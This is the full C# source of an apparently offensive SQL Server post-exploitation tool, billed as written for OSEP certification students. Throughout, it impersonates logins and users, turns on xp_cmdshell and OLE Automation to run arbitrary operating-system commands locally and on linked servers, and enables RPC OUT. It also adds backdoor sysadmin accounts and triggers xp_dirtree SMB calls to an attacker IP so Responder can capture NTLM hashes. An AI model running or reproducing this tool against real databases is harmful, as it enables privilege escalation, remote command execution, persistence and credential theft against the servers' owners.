using System;
using System.Data.SqlClient;
using System.Collections.Generic;

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            // Print the intro ASCII art to the console
            Console.WriteLine(@" __  __       _____ _____  ____  _      
|  \/  |     / ____/ ____|/ __ \| |     
| \  / | ___| (___| (___ | |  | | |     
| |\/| |/ _ \\___ \\___ \| |  | | |     
| |  | |  __/____) |___) | |__| | |____ 
|_|  |_|\___|_____/_____/ \___\_\______|
                                                       ");

            Console.WriteLine("Written by Extravenger mainly for OSEP folks.\n");

            // Ask the user for SQL Server name, Database name, Username, and Password
            Console.Write("Enter SQL Server name: ");
            string sqlServer = Console.ReadLine();

            Console.Write("Enter Database name: ");
            string database = Console.ReadLine();

            // Ask for username and password, but allow them to be left blank for integrated security
            Console.Write("Enter Username (Leave blank for Windows authentication): ");
            string username = Console.ReadLine();

            Console.Write("Enter Password (Leave blank for Windows authentication): ");
            string password = Console.ReadLine();


            // Construct the connection string dynamically
            string conString;

            // If username and password are provided, use SQL Server authentication
            if (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
            {
                conString = $"Server={sqlServer}; Database={database}; User Id={username}; Password={password}; MultipleActiveResultSets=true;";
            }
            else
            {
                // If username and password are not provided, use Windows authentication (integrated security)
                conString = $"Server={sqlServer}; Database={database}; Integrated Security=True; MultipleActiveResultSets=true;";
            }

            // Create a new SqlConnection object with the constructed connection string
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open(); // Open the connection
                Console.WriteLine("\n[+] Connection established successfully." + "\n");

                string query = "SELECT SYSTEM_USER AS LoggedInUser, USER_NAME() AS MappedUser;";

                using (SqlCommand command = new SqlCommand(query, con))
                {
                    // Execute the query
                    using (SqlDataReader reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            // Fetch the results
                            string loggedInUser = reader["LoggedInUser"].ToString();
                            string mappedUser = reader["MappedUser"].ToString();

                            // Display the results
                            Console.WriteLine($"\tLogged-in User: {loggedInUser}");
                            Console.WriteLine($"\tMapped to User: {mappedUser}\n");
                        }
                    }
                }



                while (true)
                {
                    // List logins and users
                    List<string> impersonableLogins = ListImpersonableLogins(con);
                    List<string> impersonableUsers = ListImpersonableUsers(con);

                    // Display available options
                    Console.WriteLine("[+] Choose an option:" + "\n");
                    Console.WriteLine("\t" + "1. Impersonate a login (EXECUTE AS LOGIN in current instance)");
                    Console.WriteLine("\t" + "2. Impersonate a user (EXECUTE AS USER in current instance)");
                    Console.WriteLine("\t" + "3. Execute command on a linked server (EXEC AT LinkedServer)");
                    Console.WriteLine("\t" + "4. Perform xp_dirtree");
                    Console.WriteLine("\t" + "5. Create new sysadmin user (local/remote)");
                    Console.WriteLine("\t" + "6. Pull login-mapping and execute commands on linked server.");
                    Console.WriteLine("\t" + "7. Enable RPCOUT on linked server.\n");
                    Console.Write("[+] Enter 1, 2,3,4,5 or 6: ");
                    string choice = Console.ReadLine();

                    if (choice.Equals("exit", StringComparison.OrdinalIgnoreCase))
                    {
                        Console.WriteLine("Exiting...");
                        break;
                    }

                    if (choice == "1")
                    {
                        // Display list of logins to impersonate
                        Console.WriteLine("\nSelect a login to impersonate:" + "\n");
                        for (int i = 0; i < impersonableLogins.Count; i++)
                        {
                            Console.WriteLine($"\t{i + 1}. {impersonableLogins[i]}\n");
                        }
                        Console.Write("[+] Enter the number of the login to impersonate: ");
                        int loginChoice = int.Parse(Console.ReadLine()) - 1;

                        if (loginChoice >= 0 && loginChoice < impersonableLogins.Count)
                        {
                            string selectedLogin = impersonableLogins[loginChoice];
                            ImpersonateLoginAndExecuteCommand(con, selectedLogin);
                        }
                        else
                        {
                            Console.WriteLine("[!] Invalid choice.");
                        }
                    }
                    else if (choice == "2")
                    {
                        // Display list of users to impersonate
                        Console.WriteLine("\nSelect a user to impersonate:" + "\n");
                        for (int i = 0; i < impersonableUsers.Count; i++)
                        {
                            Console.WriteLine($"\t{i + 1}. {impersonableUsers[i]}");
                        }
                        Console.Write("\n[+] Enter the number of the user to impersonate: ");
                        int userChoice = int.Parse(Console.ReadLine()) - 1;

                        if (userChoice >= 0 && userChoice < impersonableUsers.Count)
                        {
                            ImpersonateAndExecute(con, impersonableUsers[userChoice]);
                        }
                        else
                        {
                            Console.WriteLine("[!] Invalid choice.");
                        }
                    }
                    else if (choice == "3")
                    {
                        List<string> linkedServers = ListLinkedServers(con);

                        if (linkedServers.Count == 0)
                        {
                            Console.WriteLine("No linked servers found.");
                            continue;
                        }

                        Console.WriteLine("\n[+] Available linked servers:\n");
                        for (int i = 0; i < linkedServers.Count; i++)
                        {
                            Console.WriteLine($"\t{i + 1}. {linkedServers[i]}\n");
                        }

                        Console.Write("[+] Enter the number of the linked server to execute commands on: ");
                        if (int.TryParse(Console.ReadLine(), out int linkedServerChoice) && linkedServerChoice > 0 && linkedServerChoice <= linkedServers.Count)
                        {
                            string selectedLinkedServer = linkedServers[linkedServerChoice - 1];
                            ExecuteCommandsOnLinkedServer(con, selectedLinkedServer);
                        }
                        else
                        {
                            Console.WriteLine("[!] Invalid choice. Please select a valid number.");
                        }
                    }

                    else if (choice == "4")
                    {
                        Console.Write("\n\t[+] Make sure to fire up responder: sudo responder -I <interface>\n");
                        Console.Write("\t[+] Enter the IP address to catch the SMB call: ");
                        string ipAddress = Console.ReadLine();

                        // Ensure the IP address is valid
                        if (string.IsNullOrWhiteSpace(ipAddress))
                        {
                            Console.WriteLine("Invalid IP address. Try again.");
                            continue;
                        }

                        // Run xp_dirtree
                        RunXpDirtree(con, ipAddress);
                    }

                    else if (choice == "5")  // Create new user on either connected instance or linked server
                    {
                        Console.Write("[+] Enter the sysadmin username for the new user: ");
                        string sysadmuser = Console.ReadLine();

                        Console.Write("[+] Enter the sysadmin password for the new user: ");
                        string sysadmpassword = Console.ReadLine();

                        // Ask the user whether they want to create the user on the connected instance or on a linked server
                        Console.WriteLine("\n[+] Where do you want to create the user?\n");
                        Console.WriteLine("\t1. On the connected instance");
                        Console.WriteLine("\t2. On a linked server\n");

                        Console.Write("[+] Enter your choice (1 or 2): ");
                        string userChoice = Console.ReadLine();

                        if (userChoice == "1")
                        {
                            // Create the user on the connected SQL Server instance and make it sysadmin
                            CreateUserOnConnectedInstance(con, sysadmuser, sysadmpassword);
                        }
                        else if (userChoice == "2")
                        {
                            // List linked servers
                            List<string> linkedServers = ListLinkedServers(con);

                            if (linkedServers.Count == 0)
                            {
                                Console.WriteLine("No linked servers found.");
                                continue;
                            }

                            Console.WriteLine("\n[+] Available linked servers:\n");
                            for (int i = 0; i < linkedServers.Count; i++)
                            {
                                Console.WriteLine($"\t{i + 1}. {linkedServers[i]}\n");
                            }

                            Console.Write("[+] Enter the number of the linked server to create the user on: ");
                            if (int.TryParse(Console.ReadLine(), out int linkedServerChoice) && linkedServerChoice > 0 && linkedServerChoice <= linkedServers.Count)
                            {
                                string selectedLinkedServer = linkedServers[linkedServerChoice - 1];
                                CreateUserOnLinkedServer(con, selectedLinkedServer, sysadmuser, sysadmpassword);
                            }
                            else
                            {
                                Console.WriteLine("[!] Invalid choice. Please select a valid number.");
                            }
                        }
                        else
                        {
                            Console.WriteLine("[!] Invalid choice. Please enter 1 or 2.");
                        }
                    }

                    if (choice == "7")
                    {
                        // Display a list of linked servers
                        List<string> linkedServers = ListLinkedServers(con);
                        Console.WriteLine("\nSelect a linked server to enable RPCOUT:" + "\n");

                        for (int i = 0; i < linkedServers.Count; i++)
                        {
                            Console.WriteLine($"\t{i + 1}. {linkedServers[i]}\n");
                        }

                        Console.Write("[+] Enter the number of the linked server: ");
                        int serverChoice = int.Parse(Console.ReadLine()) - 1;

                        if (serverChoice >= 0 && serverChoice < linkedServers.Count)
                        {
                            string selectedServer = linkedServers[serverChoice];
                            EnableRpcOut(con, selectedServer);
                        }
                        else
                        {
                            Console.WriteLine("[!] Invalid choice.");
                        }
                    }


                    if (choice == "6")
                    {
                        // Display list of logins to impersonate
                        Console.WriteLine("\n[+] Retrieving login mappings...\n");

                        // Fetch login mappings from the connected instance
                        List<string> impersonableLogins2 = PullLoginMappings(con); // Retrieve login mappings

                        if (impersonableLogins2.Count == 0)
                        {
                            Console.WriteLine("[!] No login mappings found.");
                        }
                        else
                        {
                            Console.WriteLine("[+] Select a login to impersonate:\n");
                            for (int i = 0; i < impersonableLogins2.Count; i++)
                            {
                                Console.WriteLine($"\t{i + 1}. {impersonableLogins2[i]}\n");
                            }
                            Console.Write("[+] Enter the number of the login to impersonate: ");
                            int loginChoice = int.Parse(Console.ReadLine()) - 1;

                            if (loginChoice >= 0 && loginChoice < impersonableLogins2.Count)
                            {
                                string selectedLogin = impersonableLogins2[loginChoice];

                                // Step 1: List all linked servers where login impersonation is possible
                                List<string> linkedServers = ListLinkedServers(con); // Retrieve linked servers
                                Console.WriteLine("\n[+] Available linked servers to impersonate login:\n");

                                foreach (var server in linkedServers)
                                {
                                    Console.WriteLine($"\t- {server}");
                                }

                                // Step 2: Ask user for the linked server and command to execute
                                Console.Write("\n[+] Enter the linked server name from the above list: ");
                                string linkedServer = Console.ReadLine();

                                if (string.IsNullOrEmpty(linkedServer) || !linkedServers.Contains(linkedServer))
                                {
                                    Console.WriteLine("[!] Invalid linked server name.");
                                    return;
                                }

                                Console.Write("[+] Enter the command to execute on the linked server: ");
                                string userCommand = Console.ReadLine();

                                if (string.IsNullOrEmpty(userCommand))
                                {
                                    Console.WriteLine("[!] Command cannot be empty.");
                                    return;
                                }

                                // Step 3: Enable xp_cmdshell ONCE for the linked server
                                bool xpCmdShellEnabled = false;
                                if (!xpCmdShellEnabled)
                                {
                                    EnableXpCmdShellOnLinkedServer(con, linkedServer);
                                    xpCmdShellEnabled = true;  // Set flag to true, no need to enable again
                                }

                                // Step 4: Impersonate the login and execute the command
                                ImpersonateLoginAndExecute(con, selectedLogin, linkedServer, userCommand);
                            }
                            else
                            {
                                Console.WriteLine("[!] Invalid login choice.");
                            }

                        }

                    }

                }


            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] An error occurred while opening the connection: " + ex.Message);
            }
            finally
            {
                if (con.State == System.Data.ConnectionState.Open)
                {
                    con.Close();
                    Console.WriteLine("Connection closed.");
                }
            }
        }

        static void EnableRpcOut(SqlConnection con, string serverName)
        {
            try
            {
                // Query to enable RPCOUT on the specified server
                string enableRpcOutCmd = $"EXEC sp_serveroption @server = '{serverName}', @optname = 'rpc out', @optvalue = 'true';";
                SqlCommand enableCommand = new SqlCommand(enableRpcOutCmd, con);
                enableCommand.ExecuteNonQuery();

                Console.WriteLine($"[+] Enabled RPCOUT on server: {serverName}\n");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error enabling RPCOUT on server {serverName}: " + ex.Message);
            }
        }

        static void RunXpDirtree(SqlConnection con, string ipAddress)
        {
            try
            {
                // Generate a random share name
                string randomShare = "share" + GetRandomString(8);  // Generate a random string for the share name

                // SQL query to run xp_dirtree with the provided IP address and random share
                string query = $"EXEC xp_dirtree '\\\\{ipAddress}\\{randomShare}', 1, 1;";

                using (SqlCommand command = new SqlCommand(query, con))
                {
                    // Execute the command to run xp_dirtree
                    command.ExecuteNonQuery();
                    Console.WriteLine($"\t[+] SMB call sent to {ipAddress} with share: {randomShare}.\n");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred: {ex.Message}");
            }
        }

        // Helper function to generate a random string of a specified length
        static string GetRandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            Random random = new Random();
            char[] stringChars = new char[length];

            for (int i = 0; i < length; i++)
            {
                stringChars[i] = chars[random.Next(chars.Length)];
            }

            return new string(stringChars);
        }

        static List<string> GetLoginMappings(SqlConnection con)
        {
            List<string> impersonableLogins = new List<string>();

            try
            {
                string query = @"
            SELECT sp.name AS LocalLogin
            FROM sys.linked_logins AS ll
            JOIN sys.servers AS s ON ll.server_id = s.server_id
            LEFT JOIN sys.server_principals AS sp ON ll.local_principal_id = sp.principal_id;
        ";

                SqlCommand command = new SqlCommand(query, con);
                SqlDataReader reader = command.ExecuteReader();

                while (reader.Read())
                {
                    string localLogin = reader["LocalLogin"]?.ToString();
                    if (!string.IsNullOrEmpty(localLogin))
                    {
                        impersonableLogins.Add(localLogin);
                    }
                }

                reader.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Error pulling login mappings: " + ex.Message);
            }

            return impersonableLogins;
        }


        static void ImpersonateLoginAndExecuteCommand(SqlConnection con, string impersonatedLogin)
        {
            try
            {
                string impersonateCmd = $"EXECUTE AS LOGIN = '{impersonatedLogin}';";
                SqlCommand impersonateCommand = new SqlCommand(impersonateCmd, con);
                impersonateCommand.ExecuteNonQuery();
                Console.WriteLine($"\nImpersonating login: {impersonatedLogin}...\n");

                // Ask the user to choose between xp_cmdshell or sp_oamethod
                Console.WriteLine("Choose how to execute the command:" + "\n");
                Console.WriteLine("\t" + "1. Use xp_cmdshell");
                Console.WriteLine("\t" + "2. Use sp_oamethod (WScript Shell)" + "\n");
                Console.Write("[+] Enter 1 or 2: ");
                string execChoice = Console.ReadLine();

                // Get the command to execute from the user
                Console.Write("[+] Enter the full command to execute: ");
                string usercommand = Console.ReadLine();

                if (execChoice == "1")
                {
                    // Execute using xp_cmdshell
                    EnableXpCmdShell(con); // Ensure xp_cmdshell is enabled before running the command
                    ExecuteCommandWithXpCmdShell(con, usercommand);

                }
                else if (execChoice == "2")
                {
                    // Execute using sp_oamethod
                    ExecuteCommandWithSpOaMethod(con, usercommand);
                }
                else
                {
                    Console.WriteLine("[!] Invalid choice. Please enter 1 or 2.");
                }

                // Revert the impersonation after Option 1
                string revertCmd = "REVERT;";
                SqlCommand revertCommand = new SqlCommand(revertCmd, con);
                revertCommand.ExecuteNonQuery();
                Console.WriteLine("\n" + "Reverted impersonation." + "\n");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Error impersonating login and executing command: " + ex.Message);
            }
        }


        static List<string> ListLinkedServers(SqlConnection con)
        {
            List<string> linkedServers = new List<string>();
            string query = "SELECT name FROM sys.servers WHERE is_linked = 1;";
            SqlCommand command = new SqlCommand(query, con);


            try
            {
                SqlDataReader reader = command.ExecuteReader();
                while (reader.Read())
                {
                    linkedServers.Add(reader.GetString(0));
                }
                reader.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Error listing linked servers: " + ex.Message);
            }

            return linkedServers;
        }

        static void ExecuteCommandsOnLinkedServer(SqlConnection con, string linkedServer)
        {
            try
            {
                // Revert any previous impersonation before interacting with linked servers
                string revertCmd = "REVERT;";
                SqlCommand revertCommand = new SqlCommand(revertCmd, con);
                revertCommand.ExecuteNonQuery();
                Console.WriteLine("\n[+] Reverted impersonation before executing commands on linked server.");

                // Determine the context under which the user is running on the linked server
                string checkContextQuery = $@"
            EXEC ('SELECT SYSTEM_USER AS CurrentUser, SESSION_USER AS SessionUser') 
            AT [{linkedServer}];
        ";

                try
                {
                    SqlCommand contextCommand = new SqlCommand(checkContextQuery, con);
                    SqlDataReader contextReader = contextCommand.ExecuteReader();

                    if (contextReader.Read())
                    {
                        string systemUser = contextReader["CurrentUser"].ToString();
                        string sessionUser = contextReader["SessionUser"].ToString();

                        Console.WriteLine($"\n[+] Current execution context on {linkedServer}:\n");
                        Console.WriteLine($"\tLogged-in User: {systemUser}");
                        Console.WriteLine($"\tMapped to User: {sessionUser}\n");
                    }
                    contextReader.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[!] Error determining context on the linked server: " + ex.Message);
                }

                // Proceed with enabling or executing commands on the linked server
                Console.WriteLine("[+] Choose an action:\n");
                Console.WriteLine("\t1. Enable xp_cmdshell");
                Console.WriteLine("\t2. Execute a command using xp_cmdshell\n");
                Console.Write("[+] Enter 1 or 2: ");
                string actionChoice = Console.ReadLine();

                if (actionChoice == "1")
                {
                    EnableXpCmdShellOnLinkedServer(con, linkedServer);
                }
                else if (actionChoice == "2")
                {
                    Console.Write("\n[+] Enter the full command to execute: ");
                    string userCommand = Console.ReadLine();

                    if (string.IsNullOrWhiteSpace(userCommand))
                    {
                        Console.WriteLine("Command cannot be empty.");
                        return;
                    }

                    ExecuteCommandOnLinkedServer(con, linkedServer, userCommand);
                }
                else
                {
                    Console.WriteLine("[!] Invalid choice. Please enter 1 or 2.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Error executing commands on linked server: " + ex.Message);
            }
        }


        // Function to create a user on a linked server

        private static void CreateUserOnConnectedInstance(SqlConnection con, string sysadmuser, string sysadmpassword)
        {
            try
            {
                string query = $@"
            CREATE LOGIN {sysadmuser} WITH PASSWORD = '{sysadmpassword}';
            CREATE USER {sysadmuser} FOR LOGIN {sysadmuser};
            ALTER SERVER ROLE sysadmin ADD MEMBER {sysadmuser};
        ";

                using (SqlCommand cmd = new SqlCommand(query, con))
                {
                    cmd.ExecuteNonQuery();
                    Console.WriteLine($"[+] Sysadmin user '{sysadmuser}' created on the connected instance.\n");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error creating sysadmin user on connected instance: {ex.Message}");
            }
        }

        // Function to create a user on a linked server and make it sysadmin
        private static void CreateUserOnLinkedServer(SqlConnection con, string linkedServer, string sysadmuser, string sysadmpassword)
        {
            try
            {
                string query = $@"
            EXEC ('CREATE LOGIN {sysadmuser} WITH PASSWORD = ''{sysadmpassword}''; CREATE USER {sysadmuser} FOR LOGIN {sysadmuser}; ALTER SERVER ROLE sysadmin ADD MEMBER {sysadmuser};') 
            AT {linkedServer};
        ";

                using (SqlCommand cmd = new SqlCommand(query, con))
                {
                    cmd.ExecuteNonQuery();
                    Console.WriteLine($"\n\t[+] Sysadmin user '{sysadmuser}' created on linked server '{linkedServer}'.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error creating sysadmin user on linked server '{linkedServer}': {ex.Message}");
            }
        }
        static void EnableXpCmdShellOnLinkedServer(SqlConnection con, string linkedServer)
        {
            try
            {
                String enableadvoptions = $"EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT [{linkedServer}]";
                String enablexpcmdshell = $"EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [{linkedServer}]";
                SqlCommand command = new SqlCommand(enableadvoptions, con);
                SqlDataReader reader = command.ExecuteReader();
                reader.Close();
                command = new SqlCommand(enablexpcmdshell, con);
                reader = command.ExecuteReader();
                reader.Close();
                Console.WriteLine($"\n[+] Successfully enabled xp_cmdshell on {linkedServer}\n");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Error enabling xp_cmdshell on linked server: " + ex.Message);
            }
        }


        static void ImpersonateLoginAndExecute(SqlConnection con, string localLogin, string linkedServer, string userCommand)
        {
            try
            {
                // Impersonate the local login
                string impersonateLoginQuery = $"EXECUTE AS LOGIN = '{localLogin}';";
                SqlCommand command = new SqlCommand(impersonateLoginQuery, con);
                command.ExecuteNonQuery();
                Console.WriteLine($"\n[+] Impersonated login: {localLogin}");

                // Enable xp_cmdshell on the linked server (assuming it's not already enabled)
                EnableXpCmdShellOnLinkedServer(con, linkedServer);

                // Execute the user command on the linked server
                ExecuteCommandOnLinkedServer(con, linkedServer, userCommand);

                // Revert to the original execution context
                string revertQuery = "REVERT;";
                command = new SqlCommand(revertQuery, con);
                command.ExecuteNonQuery();
                Console.WriteLine("\n[+] Reverted to original execution context.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Error impersonating login or executing command: " + ex.Message);
            }
        }




        static void ExecuteCommandOnLinkedServer(SqlConnection con, string linkedServer, string userCommand)
        {
            try
            {
                string execCmd = $"EXEC ('xp_cmdshell ''{userCommand.Replace("'", "''")}''') AT [{linkedServer}];";
                SqlCommand command = new SqlCommand(execCmd, con);
                SqlDataReader reader = command.ExecuteReader();

                bool hasOutput = false;
                while (reader.Read())
                {
                    string result = reader.IsDBNull(0) ? null : reader.GetString(0);
                    if (result != null)
                    {
                        Console.WriteLine(result);
                        hasOutput = true;
                    }
                }

                if (!hasOutput)
                {
                    Console.WriteLine("No output returned from xp_cmdshell.");
                }

                reader.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Error executing command on linked server: " + ex.Message);
            }
        }


        static List<string> PullLoginMappings(SqlConnection con)
        {
            List<string> impersonableLogins2 = new List<string>();

            try
            {
                // Query to get login mappings from the linked servers
                string query = @"
            SELECT sp.name AS LocalLogin
            FROM sys.linked_logins AS ll
            JOIN sys.servers AS s ON ll.server_id = s.server_id
            LEFT JOIN sys.server_principals AS sp ON ll.local_principal_id = sp.principal_id;
        ";

                SqlCommand command = new SqlCommand(query, con);
                SqlDataReader reader = command.ExecuteReader();

                // Collect the login mappings into a list
                while (reader.Read())
                {
                    string localLogin = reader["LocalLogin"]?.ToString();
                    if (!string.IsNullOrEmpty(localLogin))
                    {
                        impersonableLogins2.Add(localLogin); // Using the new variable name
                    }
                }

                reader.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Error pulling login mappings: " + ex.Message);
            }

            return impersonableLogins2; // Return the new list of logins
        }




        static List<string> ListImpersonableLogins(SqlConnection con)
        {
            List<string> logins = new List<string>();
            string query = "SELECT name FROM sys.server_principals WHERE type IN ('S', 'U')";
            SqlCommand command = new SqlCommand(query, con);

            try
            {
                SqlDataReader reader = command.ExecuteReader();
                while (reader.Read())
                {
                    logins.Add(reader.GetString(0));
                }
                reader.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Error listing logins: " + ex.Message);
            }

            return logins;
        }

        static void ImpersonateAndExecute(SqlConnection con, string impersonatedUser)
        {
            try
            {
                // If the user is 'dbo', switch to msdb first
                if (impersonatedUser.Equals("dbo", StringComparison.OrdinalIgnoreCase))
                {
                    string switchToMsdbCmd = "USE msdb; EXECUTE AS USER = 'dbo';";
                    SqlCommand switchToMsdbCommand = new SqlCommand(switchToMsdbCmd, con);
                    switchToMsdbCommand.ExecuteNonQuery();
                    Console.WriteLine("\nSwitched to msdb and impersonating dbo user...\n");
                }
                else
                {
                    string impersonateCmd = $"EXECUTE AS USER = '{impersonatedUser}';";
                    SqlCommand impersonateCommand = new SqlCommand(impersonateCmd, con);
                    impersonateCommand.ExecuteNonQuery();
                    Console.WriteLine($"\nImpersonating user: {impersonatedUser}...\n");
                }

                // Ask the user to choose between xp_cmdshell or sp_oamethod
                Console.WriteLine("Choose how to execute the command:" + "\n");
                Console.WriteLine("\t" + "1. Use xp_cmdshell");
                Console.WriteLine("\t" + "2. Use sp_oamethod (WScript Shell)" + "\n");
                Console.Write("[+] Enter 1 or 2: ");
                string execChoice = Console.ReadLine();

                // Get the command to execute from the user
                Console.Write("[+] Enter the full command to execute: ");
                string usercommand = Console.ReadLine();

                if (execChoice == "1")
                {
                    // Execute using xp_cmdshell
                    EnableXpCmdShell(con); // Ensure xp_cmdshell is enabled before running the command
                    ExecuteCommandWithXpCmdShell(con, usercommand);
                }
                else if (execChoice == "2")
                {
                    // Execute using sp_oamethod
                    ExecuteCommandWithSpOaMethod(con, usercommand);
                }
                else
                {
                    Console.WriteLine("[!] Invalid choice. Please enter 1 or 2.");
                }

                // Revert the impersonation
                string revertCmd = "REVERT;";
                SqlCommand revertCommand = new SqlCommand(revertCmd, con);
                revertCommand.ExecuteNonQuery();
                Console.WriteLine("\n" + "Reverted impersonation." + "\n");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Error impersonating user and executing command: " + ex.Message);
            }
        }

        static void ExecuteCommandWithSpOaMethod(SqlConnection con, string usercommand)
        {
            try
            {
                // Ensure OLE Automation Procedures are enabled
                string enableOleAutomation = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
                SqlCommand enableCommand = new SqlCommand(enableOleAutomation, con);
                enableCommand.ExecuteNonQuery();
                Console.WriteLine("[+] Enabled OLE Automation Procedures.\n");

                // Create and use the WScript.Shell instance in a single batch
                string execCmd = $@"
            DECLARE @shell INT;
            EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
            EXEC sp_oamethod @shell, 'Run', NULL, '{usercommand}', 0, TRUE;
            EXEC sp_OADestroy @shell;";  // Clean up the created COM object

                SqlCommand command = new SqlCommand(execCmd, con);
                SqlDataReader reader = command.ExecuteReader();

                // Revert impersonation after executing the command
                string revertCmd = "REVERT;";
                SqlCommand revertCommand = new SqlCommand(revertCmd, con);
                revertCommand.ExecuteNonQuery();
                Console.WriteLine("\n[+] Reverted impersonation.\n");

                // Simply indicate that the command executed successfully
                Console.WriteLine("[+] Command executed successfully.");

                reader.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Error executing command with sp_oamethod: " + ex.Message);
            }
        }


        static void ExecuteCommandWithXpCmdShell(SqlConnection con, string usercommand)
        {
            try
            {
                // Execute the full command provided by the user using xp_cmdshell
                string execCmd = $"EXEC xp_cmdshell '{usercommand}';";
                SqlCommand command = new SqlCommand(execCmd, con);
                SqlDataReader reader = command.ExecuteReader();

                bool hasOutput = false;

                while (reader.Read())
                {
                    string result = reader.IsDBNull(0) ? null : reader.GetString(0); // Check for null values in the result

                    if (result != null)
                    {
                        Console.WriteLine(result); // Output the command result if it's not null
                        hasOutput = true;
                    }
                }

                if (!hasOutput)
                {
                    Console.WriteLine("No output returned from xp_cmdshell.");
                }

                reader.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Error executing command with xp_cmdshell: " + ex.Message);
            }
        }




        static void EnableXpCmdShell(SqlConnection con)
        {
            try
            {
                // Enable xp_cmdshell if not already enabled
                string enableCmd = "EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
                SqlCommand enableCommand = new SqlCommand(enableCmd, con);
                enableCommand.ExecuteNonQuery();
                Console.WriteLine("[+] Enabled xp_cmdshell.\n");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Error enabling xp_cmdshell: " + ex.Message);
            }
        }


        static List<string> ListImpersonableUsers(SqlConnection con)
        {
            List<string> users = new List<string>();
            string query = "SELECT name FROM sys.database_principals WHERE type IN ('S', 'U', 'G');";
            SqlCommand command = new SqlCommand(query, con);

            try
            {
                SqlDataReader reader = command.ExecuteReader();
                while (reader.Read())
                {
                    users.Add(reader.GetString(0));
                }
                reader.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Error listing users: " + ex.Message);
            }

            return users;
        }
    }
}
